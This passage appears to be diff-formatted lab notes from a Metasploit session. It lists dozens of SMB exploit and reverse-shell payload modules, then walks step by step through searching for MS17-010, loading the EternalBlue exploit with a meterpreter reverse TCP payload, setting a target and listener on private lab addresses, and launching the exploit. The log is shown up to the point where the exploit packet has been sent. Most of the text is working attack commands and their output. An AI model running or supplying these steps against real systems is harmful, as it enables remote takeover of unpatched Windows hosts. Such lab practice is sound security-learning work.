+   276  payload/cmd/windows/powershell/meterpreter/reverse_named_pipe                   .                normal     No     Powershell Exec, Windows x86 Reverse Named Pipe (SMB) Stager
+   277  payload/cmd/windows/powershell/peinject/reverse_named_pipe                      .                normal     No     Powershell Exec, Windows x86 Reverse Named Pipe (SMB) Stager
+   278  auxiliary/admin/smb/psexec_ntdsgrab                                             .                normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
+   279  auxiliary/scanner/sap/sap_smb_relay                                             .                normal     No     SAP SMB Relay Abuse
+   280  auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                  .                normal     No     SAP SOAP EPS_DELETE_FILE File Deletion
+   281  auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                    .                normal     No     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
+   282  auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                  .                normal     No     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
+   283  auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                 .                normal     No     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
+   284  auxiliary/fuzzers/smb/smb_create_pipe_corrupt                                   .                normal     No     SMB Create Pipe Request Corruption                                                                                             
+   285  auxiliary/fuzzers/smb/smb_create_pipe                                           .                normal     No     SMB Create Pipe Request Fuzzer                                                                                                 
+   286  exploit/windows/smb/smb_doublepulsar_rce                                        2017-04-14       great      Yes    SMB DOUBLEPULSAR Remote Code Execution                                                                                         
+   287    \_ target: Execute payload (x64)                                              .                .          .      .
+   288    \_ target: Neutralize implant                                                 .                .          .      .
+   289  exploit/windows/smb/smb_delivery                                                2016-07-26       excellent  No     SMB Delivery                                                                                                                   
+   290    \_ target: DLL                                                                .                .          .      .
+   291    \_ target: PSH                                                                .                .          .      .
+   292  auxiliary/admin/smb/list_directory                                              .                normal     No     SMB Directory Listing Utility                                                                                                  
+   293  auxiliary/scanner/smb/smb_enumusers_domain                                      .                normal     No     SMB Domain User Enumeration                                                                                                    
+   294  payload/cmd/windows/smb/x64/powershell_bind_tcp                                 .                normal     No     SMB Fetch                                                                                                                      
+   295  payload/cmd/windows/smb/x64/powershell_reverse_tcp                              .                normal     No     SMB Fetch                                                                                                                      
+   296  payload/cmd/windows/smb/x64/powershell_reverse_tcp_ssl                          .                normal     No     SMB Fetch                                                                                                                      
+   297  payload/cmd/windows/smb/x64/meterpreter/bind_tcp_rc4                            .                normal     No     SMB Fetch, Bind TCP Stager (RC4 Stage Encryption, Metasm)                                                                      
+   298  payload/cmd/windows/smb/x64/peinject/bind_tcp_rc4                               .                normal     No     SMB Fetch, Bind TCP Stager (RC4 Stage Encryption, Metasm)                                                                      
+   299  payload/cmd/windows/smb/x64/vncinject/bind_tcp_rc4                              .                normal     No     SMB Fetch, Bind TCP Stager (RC4 Stage Encryption, Metasm)                                                                      
+   300  payload/cmd/windows/smb/x64/meterpreter/bind_tcp_uuid                           .                normal     No     SMB Fetch, Bind TCP Stager with UUID Support (Windows x64)                                                                     
+   301  payload/cmd/windows/smb/x64/peinject/bind_tcp_uuid                              .                normal     No     SMB Fetch, Bind TCP Stager with UUID Support (Windows x64)                                                                     
+   302  payload/cmd/windows/smb/x64/vncinject/bind_tcp_uuid                             .                normal     No     SMB Fetch, Bind TCP Stager with UUID Support (Windows x64)                                                                     
+   303  payload/cmd/windows/smb/x64/meterpreter/reverse_tcp_rc4                         .                normal     No     SMB Fetch, Reverse TCP Stager (RC4 Stage Encryption, Metasm)                                                                   
+   304  payload/cmd/windows/smb/x64/peinject/reverse_tcp_rc4                            .                normal     No     SMB Fetch, Reverse TCP Stager (RC4 Stage Encryption, Metasm)                                                                   
+   305  payload/cmd/windows/smb/x64/vncinject/reverse_tcp_rc4                           .                normal     No     SMB Fetch, Reverse TCP Stager (RC4 Stage Encryption, Metasm)                                                                   
+   306  payload/cmd/windows/smb/x64/meterpreter/reverse_tcp_uuid                        .                normal     No     SMB Fetch, Reverse TCP Stager with UUID Support (Windows x64)                                                                  
+   307  payload/cmd/windows/smb/x64/peinject/reverse_tcp_uuid                           .                normal     No     SMB Fetch, Reverse TCP Stager with UUID Support (Windows x64)                                                                  
+   308  payload/cmd/windows/smb/x64/vncinject/reverse_tcp_uuid                          .                normal     No     SMB Fetch, Reverse TCP Stager with UUID Support (Windows x64)                                                                  
+   309  payload/cmd/windows/smb/x64/encrypted_shell/reverse_tcp                         .                normal     No     SMB Fetch, Windows Command Shell, Encrypted Reverse TCP Stager                                                                 
+   310  payload/cmd/windows/smb/x64/encrypted_shell_reverse_tcp                         .                normal     No     SMB Fetch, Windows Encrypted Reverse Shell                                                                                     
+   311  payload/cmd/windows/smb/x64/messagebox                                          .                normal     No     SMB Fetch, Windows MessageBox x64                                                                                              
+   312  payload/cmd/windows/smb/x64/meterpreter_bind_named_pipe                         .                normal     No     SMB Fetch, Windows Meterpreter Shell, Bind Named Pipe Inline (x64)                                                             
+   313  payload/cmd/windows/smb/x64/meterpreter_bind_tcp                                .                normal     No     SMB Fetch, Windows Meterpreter Shell, Bind TCP Inline (x64)                                                                    
+   314  payload/cmd/windows/smb/x64/meterpreter_reverse_http                            .                normal     No     SMB Fetch, Windows Meterpreter Shell, Reverse HTTP Inline (x64)                                                                
+   315  payload/cmd/windows/smb/x64/meterpreter_reverse_https                           .                normal     No     SMB Fetch, Windows Meterpreter Shell, Reverse HTTPS Inline (x64)                                                               
+   316  payload/cmd/windows/smb/x64/meterpreter_reverse_ipv6_tcp                        .                normal     No     SMB Fetch, Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)                                                          
+   317  payload/cmd/windows/smb/x64/meterpreter_reverse_tcp                             .                normal     No     SMB Fetch, Windows Meterpreter Shell, Reverse TCP Inline x64                                                                   
+   318  payload/cmd/windows/smb/x64/custom/bind_tcp_rc4                                 .                normal     No     SMB Fetch, Windows shellcode stage, Bind TCP Stager (RC4 Stage Encryption, Metasm)                                             
+   319  payload/cmd/windows/smb/x64/custom/bind_tcp_uuid                                .                normal     No     SMB Fetch, Windows shellcode stage, Bind TCP Stager with UUID Support (Windows x64)                                            
+   320  payload/cmd/windows/smb/x64/custom/reverse_tcp_rc4                              .                normal     No     SMB Fetch, Windows shellcode stage, Reverse TCP Stager (RC4 Stage Encryption, Metasm)                                          
+   321  payload/cmd/windows/smb/x64/custom/reverse_tcp_uuid                             .                normal     No     SMB Fetch, Windows shellcode stage, Reverse TCP Stager with UUID Support (Windows x64)                                         
+   322  payload/cmd/windows/smb/x64/custom/bind_named_pipe                              .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Bind Named Pipe Stager                                                         
+   323  payload/cmd/windows/smb/x64/custom/bind_tcp                                     .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Bind TCP Stager                                                                
+   324  payload/cmd/windows/smb/x64/custom/bind_ipv6_tcp                                .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 IPv6 Bind TCP Stager                                                           
+   325  payload/cmd/windows/smb/x64/custom/bind_ipv6_tcp_uuid                           .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 IPv6 Bind TCP Stager with UUID Support                                         
+   326  payload/cmd/windows/smb/x64/custom/reverse_winhttp                              .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Reverse HTTP Stager (winhttp)                                                  
+   327  payload/cmd/windows/smb/x64/custom/reverse_http                                 .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Reverse HTTP Stager (wininet)                                                  
+   328  payload/cmd/windows/smb/x64/custom/reverse_https                                .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Reverse HTTP Stager (wininet)                                                  
+   329  payload/cmd/windows/smb/x64/custom/reverse_winhttps                             .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Reverse HTTPS Stager (winhttp)                                                 
+   330  payload/cmd/windows/smb/x64/custom/reverse_named_pipe                           .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager                                                
+   331  payload/cmd/windows/smb/x64/custom/reverse_tcp                                  .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Reverse TCP Stager                                                             
+   332  payload/cmd/windows/smb/x64/meterpreter/bind_named_pipe                         .                normal     No     SMB Fetch, Windows x64 Bind Named Pipe Stager                                                                                  
+   333  payload/cmd/windows/smb/x64/peinject/bind_named_pipe                            .                normal     No     SMB Fetch, Windows x64 Bind Named Pipe Stager                                                                                  
+   334  payload/cmd/windows/smb/x64/vncinject/bind_named_pipe                           .                normal     No     SMB Fetch, Windows x64 Bind Named Pipe Stager                                                                                  
+   335  payload/cmd/windows/smb/x64/meterpreter/bind_tcp                                .                normal     No     SMB Fetch, Windows x64 Bind TCP Stager                                                                                         
+   336  payload/cmd/windows/smb/x64/peinject/bind_tcp                                   .                normal     No     SMB Fetch, Windows x64 Bind TCP Stager                                                                                         
+   337  payload/cmd/windows/smb/x64/vncinject/bind_tcp                                  .                normal     No     SMB Fetch, Windows x64 Bind TCP Stager                                                                                         
+   338  payload/cmd/windows/smb/x64/shell_bind_tcp                                      .                normal     No     SMB Fetch, Windows x64 Command Shell, Bind TCP Inline                                                                          
+   339  payload/cmd/windows/smb/x64/shell/bind_tcp_rc4                                  .                normal     No     SMB Fetch, Windows x64 Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)                                           
+   340  payload/cmd/windows/smb/x64/shell/bind_tcp_uuid                                 .                normal     No     SMB Fetch, Windows x64 Command Shell, Bind TCP Stager with UUID Support (Windows x64)                                          
+   341  payload/cmd/windows/smb/x64/shell_reverse_tcp                                   .                normal     No     SMB Fetch, Windows x64 Command Shell, Reverse TCP Inline                                                                       
+   342  payload/cmd/windows/smb/x64/shell/reverse_tcp_rc4                               .                normal     No     SMB Fetch, Windows x64 Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)                                        
+   343  payload/cmd/windows/smb/x64/shell/reverse_tcp_uuid                              .                normal     No     SMB Fetch, Windows x64 Command Shell, Reverse TCP Stager with UUID Support (Windows x64)                                       
+   344  payload/cmd/windows/smb/x64/shell/bind_named_pipe                               .                normal     No     SMB Fetch, Windows x64 Command Shell, Windows x64 Bind Named Pipe Stager                                                       
+   345  payload/cmd/windows/smb/x64/shell/bind_tcp                                      .                normal     No     SMB Fetch, Windows x64 Command Shell, Windows x64 Bind TCP Stager                                                              
+   346  payload/cmd/windows/smb/x64/shell/bind_ipv6_tcp                                 .                normal     No     SMB Fetch, Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager                                                         
+   347  payload/cmd/windows/smb/x64/shell/bind_ipv6_tcp_uuid                            .                normal     No     SMB Fetch, Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager with UUID Support                                       
+   348  payload/cmd/windows/smb/x64/shell/reverse_tcp                                   .                normal     No     SMB Fetch, Windows x64 Command Shell, Windows x64 Reverse TCP Stager                                                           
+   349  payload/cmd/windows/smb/x64/exec                                                .                normal     No     SMB Fetch, Windows x64 Execute Command                                                                                         
+   350  payload/cmd/windows/smb/x64/meterpreter/bind_ipv6_tcp                           .                normal     No     SMB Fetch, Windows x64 IPv6 Bind TCP Stager                                                                                    
+   351  payload/cmd/windows/smb/x64/peinject/bind_ipv6_tcp                              .                normal     No     SMB Fetch, Windows x64 IPv6 Bind TCP Stager                                                                                    
+   352  payload/cmd/windows/smb/x64/vncinject/bind_ipv6_tcp                             .                normal     No     SMB Fetch, Windows x64 IPv6 Bind TCP Stager                                                                                    
+   353  payload/cmd/windows/smb/x64/meterpreter/bind_ipv6_tcp_uuid                      .                normal     No     SMB Fetch, Windows x64 IPv6 Bind TCP Stager with UUID Support                                                                  
+   354  payload/cmd/windows/smb/x64/peinject/bind_ipv6_tcp_uuid                         .                normal     No     SMB Fetch, Windows x64 IPv6 Bind TCP Stager with UUID Support                                                                  
+   355  payload/cmd/windows/smb/x64/vncinject/bind_ipv6_tcp_uuid                        .                normal     No     SMB Fetch, Windows x64 IPv6 Bind TCP Stager with UUID Support                                                                  
+   356  payload/cmd/windows/smb/x64/loadlibrary                                         .                normal     No     SMB Fetch, Windows x64 LoadLibrary Path                                                                                        
+   357  payload/cmd/windows/smb/x64/pingback_reverse_tcp                                .                normal     No     SMB Fetch, Windows x64 Pingback, Reverse TCP Inline                                                                            
+   358  payload/cmd/windows/smb/x64/meterpreter/reverse_winhttp                         .                normal     No     SMB Fetch, Windows x64 Reverse HTTP Stager (winhttp)                                                                           
+   359  payload/cmd/windows/smb/x64/vncinject/reverse_winhttp                           .                normal     No     SMB Fetch, Windows x64 Reverse HTTP Stager (winhttp)                                                                           
+   360  payload/cmd/windows/smb/x64/meterpreter/reverse_http                            .                normal     No     SMB Fetch, Windows x64 Reverse HTTP Stager (wininet)                                                                           
+   361  payload/cmd/windows/smb/x64/meterpreter/reverse_https                           .                normal     No     SMB Fetch, Windows x64 Reverse HTTP Stager (wininet)                                                                           
+   362  payload/cmd/windows/smb/x64/vncinject/reverse_http                              .                normal     No     SMB Fetch, Windows x64 Reverse HTTP Stager (wininet)                                                                           
+   363  payload/cmd/windows/smb/x64/vncinject/reverse_https                             .                normal     No     SMB Fetch, Windows x64 Reverse HTTP Stager (wininet)                                                                           
+   364  payload/cmd/windows/smb/x64/meterpreter/reverse_winhttps                        .                normal     No     SMB Fetch, Windows x64 Reverse HTTPS Stager (winhttp)                                                                          
+   365  payload/cmd/windows/smb/x64/vncinject/reverse_winhttps                          .                normal     No     SMB Fetch, Windows x64 Reverse HTTPS Stager (winhttp)                                                                          
+   366  payload/cmd/windows/smb/x64/meterpreter/reverse_named_pipe                      .                normal     No     SMB Fetch, Windows x64 Reverse Named Pipe (SMB) Stager                                                                         
+   367  payload/cmd/windows/smb/x64/peinject/reverse_named_pipe                         .                normal     No     SMB Fetch, Windows x64 Reverse Named Pipe (SMB) Stager                                                                         
+   368  payload/cmd/windows/smb/x64/meterpreter/reverse_tcp                             .                normal     No     SMB Fetch, Windows x64 Reverse TCP Stager                                                                                      
+   369  payload/cmd/windows/smb/x64/peinject/reverse_tcp                                .                normal     No     SMB Fetch, Windows x64 Reverse TCP Stager                                                                                      
+   370  payload/cmd/windows/smb/x64/vncinject/reverse_tcp                               .                normal     No     SMB Fetch, Windows x64 Reverse TCP Stager                                                                                      
+   371  auxiliary/admin/smb/delete_file                                                 .                normal     No     SMB File Delete Utility                                                                                                        
+   372  auxiliary/admin/smb/download_file                                               .                normal     No     SMB File Download Utility                                                                                                      
+   373  auxiliary/admin/smb/upload_file                                                 .                normal     No     SMB File Upload Utility                                                                                                        
+   374  auxiliary/scanner/smb/smb_enum_gpp                                              .                normal     No     SMB Group Policy Preference Saved Passwords Enumeration                                                                        
+   375  auxiliary/scanner/smb/smb_login                                                 .                normal     No     SMB Login Check Scanner                                                                                                        
+   376  auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                                   .                normal     No     SMB NTLMv1 Login Request Corruption                                                                                            
+   377  auxiliary/fuzzers/smb/smb_negotiate_corrupt                                     .                normal     No     SMB Negotiate Dialect Corruption                                                                                               
+   378  auxiliary/fuzzers/smb/smb2_negotiate_corrupt                                    .                normal     No     SMB Negotiate SMB2 Dialect Corruption                                                                                          
+   379  auxiliary/scanner/smb/smb_lookupsid                                             .                normal     No     SMB SID User Enumeration (LookupSid)                                                                                           
+   380    \_ action: DOMAIN                                                             .                .          .      Enumerate domain accounts
+   381    \_ action: LOCAL                                                              .                .          .      Enumerate local accounts
+   382  auxiliary/admin/smb/check_dir_file                                              .                normal     No     SMB Scanner Check File/Directory Utility                                                                                       
+   383  auxiliary/scanner/smb/pipe_auditor                                              .                normal     No     SMB Session Pipe Auditor                                                                                                       
+   384  auxiliary/scanner/smb/pipe_dcerpc_auditor                                       .                normal     No     SMB Session Pipe DCERPC Auditor                                                                                                
+   385  auxiliary/scanner/smb/smb_enumshares                                            .                normal     No     SMB Share Enumeration                                                                                                          
+   386  auxiliary/fuzzers/smb/smb_tree_connect_corrupt                                  .                normal     No     SMB Tree Connect Request Corruption                                                                                            
+   387  auxiliary/fuzzers/smb/smb_tree_connect                                          .                normal     No     SMB Tree Connect Request Fuzzer                                                                                                
+   388  auxiliary/scanner/smb/smb_enumusers                                             .                normal     No     SMB User Enumeration (SAM EnumUsers)                                                                                           
+   389  auxiliary/scanner/smb/smb_version                                               .                normal     No     SMB Version Detection                                                                                                          
+   390  auxiliary/dos/smb/smb_loris                                                     2017-06-29       normal     No     SMBLoris NBSS Denial of Service                                                                                                
+   391  exploit/windows/local/cve_2020_0796_smbghost                                    2020-03-13       good       Yes    SMBv3 Compression Buffer Overflow                                                                                              
+   392    \_ AKA: SMBGhost                                                              .                .          .      .
+   393    \_ AKA: CoronaBlue                                                            .                .          .      .
+   394  exploit/windows/smb/cve_2020_0796_smbghost                                      2020-03-13       average    Yes    SMBv3 Compression Buffer Overflow                                                                                              
+   395    \_ AKA: SMBGhost                                                              .                .          .      .
+   396    \_ AKA: CoronaBlue                                                            .                .          .      .
+   397  auxiliary/scanner/snmp/snmp_enumshares                                          .                normal     No     SNMP Windows SMB Share Enumeration
+   398  auxiliary/admin/smb/samba_symlink_traversal                                     .                normal     No     Samba Symlink Directory Traversal
+   399  auxiliary/scanner/smb/smb_uninit_cred                                           .                normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
+   400  exploit/linux/samba/chain_reply                                                 2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
+   401    \_ target: Linux (Debian5 3.2.5-4lenny6)                                      .                .          .      .
+   402    \_ target: Debugging Target                                                   .                .          .      .
+   403  auxiliary/dos/samba/read_nttrans_ea_list                                        .                normal     No     Samba read_nttrans_ea_list Integer Overflow
+   404  exploit/multi/ids/snort_dce_rpc                                                 2007-02-19       good       No     Snort 2 DCE/RPC Preprocessor Buffer Overflow
+   405    \_ target: Windows Universal                                                  .                .          .      .
+   406    \_ target: Redhat 8                                                           .                .          .      .
+   407  exploit/windows/browser/java_ws_double_quote                                    2012-10-16       excellent  No     Sun Java Web Start Double Quote Injection
+   408    \_ target: Automatic                                                          .                .          .      .
+   409    \_ target: Java Runtime 1.6.31 to 1.6.35 and 1.7.03 to 1.7.07 on Windows x86  .                .          .      .
+   410  exploit/windows/browser/java_ws_arginject_altjvm                                2010-04-09       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
+   411    \_ target: Automatic                                                          .                .          .      .
+   412    \_ target: Java Runtime on Windows x86                                        .                .          .      .
+   413  exploit/windows/browser/java_ws_vmargs                                          2012-02-14       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
+   414    \_ target: Automatic                                                          .                .          .      .
+   415    \_ target: Java Runtime on Windows x86                                        .                .          .      .
+   416  payload/cmd/windows/tftp/x64/custom/reverse_named_pipe                          .                normal     No     TFTP Fetch, Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager
+   417  payload/cmd/windows/tftp/x64/meterpreter/reverse_named_pipe                     .                normal     No     TFTP Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
+   418  payload/cmd/windows/tftp/x64/peinject/reverse_named_pipe                        .                normal     No     TFTP Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
+   419  auxiliary/server/teamviewer_uri_smb_redirect                                    .                normal     No     TeamViewer Unquoted URI Handler SMB Redirect
+   420  exploit/windows/fileformat/theme_dll_hijack_cve_2023_38146                      2023-09-13       excellent  No     Themebleed- Windows 11 Themes Arbitrary Code Execution CVE-2023-38146
+   421  exploit/windows/smb/timbuktu_plughntcommand_bof                                 2009-06-25       great      No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
+   422  exploit/windows/fileformat/ursoft_w32dasm                                       2005-01-24       good       No     URSoft W32Dasm Disassembler Function Buffer Overflow
+   423  exploit/windows/fileformat/vlc_smb_uri                                          2009-06-24       great      No     VideoLAN Client (VLC) Win32 smb:// URI Buffer Overflow
+   424  auxiliary/scanner/smb/impacket/wmiexec                                          2018-03-19       normal     No     WMI Exec
+   425  auxiliary/admin/smb/webexec_command                                             .                normal     No     WebEx Remote Command Execution Utility
+   426  exploit/windows/smb/webexec                                                     2018-10-24       manual     No     WebExec Authenticated User Code Execution
+   427    \_ target: Automatic                                                          .                .          .      .
+   428    \_ target: Native upload                                                      .                .          .      .
+   429  post/windows/escalate/droplnk                                                   .                normal     No     Windows Escalate SMB Icon LNK Dropper
+   430  post/windows/gather/credentials/gpp                                             .                normal     No     Windows Gather Group Policy Preference Saved Passwords
+   431  post/windows/gather/word_unc_injector                                           .                normal     No     Windows Gather Microsoft Office Word UNC Path Injector
+   432  post/windows/gather/enum_shares                                                 .                normal     No     Windows Gather SMB Share Enumeration via Registry
+   433  payload/windows/peinject/reverse_named_pipe                                     .                normal     No     Windows Inject PE Files, Windows x86 Reverse Named Pipe (SMB) Stager
+   434  payload/windows/x64/peinject/reverse_named_pipe                                 .                normal     No     Windows Inject Reflective PE Files, Windows x64 Reverse Named Pipe (SMB) Stager
+   435  payload/windows/x64/meterpreter/reverse_named_pipe                              .                normal     No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
+   436  payload/windows/meterpreter/reverse_named_pipe                                  .                normal     No     Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager
+   437  post/windows/gather/netlm_downgrade                                             .                normal     No     Windows NetLM Downgrade Attack
+   438  auxiliary/fileformat/multidrop                                                  .                normal     No     Windows SMB Multi Dropper
+   439  payload/windows/x64/custom/reverse_named_pipe                                   .                normal     No     Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager
+   440  payload/windows/custom/reverse_named_pipe                                       .                normal     No     Windows shellcode stage, Windows x86 Reverse Named Pipe (SMB) Stager
+   441  exploit/multi/http/pgadmin_session_deserialization                              2024-03-04       excellent  Yes    pgAdmin Session Deserialization RCE
+
+
+Interact with a module by name or index. For example info 441, use 441 or use exploit/multi/http/pgadmin_session_deserialization  
+
+==================================================================================================================================================                                                                                                                        
+6. direct search ms17
+
+
+msf6 > search sm17
+[-] No results from search
+msf6 > search ms17
+
+Matching Modules
+================
+
+   #   Name                                                  Disclosure Date  Rank     Check  Description
+   -   ----                                                  ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                         .                .        .      .
+   2     \_ target: Windows 7                                .                .        .      .
+   3     \_ target: Windows Embedded Standard 7              .                .        .      .
+   4     \_ target: Windows Server 2008 R2                   .                .        .      .
+   5     \_ target: Windows 8                                .                .        .      .
+   6     \_ target: Windows 8.1                              .                .        .      .
+   7     \_ target: Windows Server 2012                      .                .        .      .
+   8     \_ target: Windows 10 Pro                           .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation         .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec                   2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                                .                .        .      .
+   12    \_ target: PowerShell                               .                .        .      .
+   13    \_ target: Native upload                            .                .        .      .
+   14    \_ target: MOF upload                               .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                              .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                              .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                             .                .        .      .
+   18    \_ AKA: ETERNALBLUE                                 .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command                  2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                              .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                              .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                             .                .        .      .
+   23    \_ AKA: ETERNALBLUE                                 .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010                    .                normal   No     MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                                .                .        .      .
+   26    \_ AKA: ETERNALBLUE                                 .                .        .      .
+   27  exploit/windows/fileformat/office_ms17_11882          2017-11-15       manual   No     Microsoft Office CVE-2017-11882
+   28  auxiliary/admin/mssql/mssql_escalate_execute_as       .                normal   No     Microsoft SQL Server Escalate EXECUTE AS
+   29  auxiliary/admin/mssql/mssql_escalate_execute_as_sqli  .                normal   No     Microsoft SQL Server SQLi Escalate Execute AS
+   30  exploit/windows/smb/smb_doublepulsar_rce              2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   31    \_ target: Execute payload (x64)                    .                .        .      .
+   32    \_ target: Neutralize implant                       .                .        .      .
+
+
+Interact with a module by name or index. For example info 32, use 32 or use exploit/windows/smb/smb_doublepulsar_rce
+After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
+
+
+use this payload
+================================================================================================================================================
+
+
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
+                                             cs/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows
+                                             Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Serv
+                                             er 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2
+                                             , Windows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.150.131  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+
+Set Remote host IP (target IP)
+============================================================================================================================================
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.150.128
+RHOSTS => 192.168.150.128
+msf6 exploit(windows/smb/ms17_010_eternalblue) > options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         192.168.150.128  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
+                                             cs/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows
+                                             Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Serv
+                                             er 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2
+                                             , Windows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.150.131  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+
+Finally exploit it.
+==================================================================================================================================================
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+[*] Started reverse TCP handler on 192.168.150.131:4444 
+[*] 192.168.150.128:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.150.128:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate E 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.150.128:445   - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.150.128:445 - The target is vulnerable.
+[*] 192.168.150.128:445 - Connecting to target for exploitation.
+[+] 192.168.150.128:445 - Connection established for exploitation.
+[+] 192.168.150.128:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.150.128:445 - CORE raw buffer dump (40 bytes)
+[*] 192.168.150.128:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
+[*] 192.168.150.128:445 - 0x00000010  74 65 20 45 20 37 36 30 31 20 53 65 72 76 69 63  te E 7601 Servic
+[*] 192.168.150.128:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
+[+] 192.168.150.128:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.150.128:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.150.128:445 - Sending all but last fragment of exploit packet
+[*] 192.168.150.128:445 - Starting non-paged pool grooming
+[+] 192.168.150.128:445 - Sending SMBv2 buffers
+[+] 192.168.150.128:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.150.128:445 - Sending final SMBv2 buffers.
+[*] 192.168.150.128:445 - Sending last fragment of exploit packet!
+[*] 192.168.150.128:445 - Receiving response from exploit packet
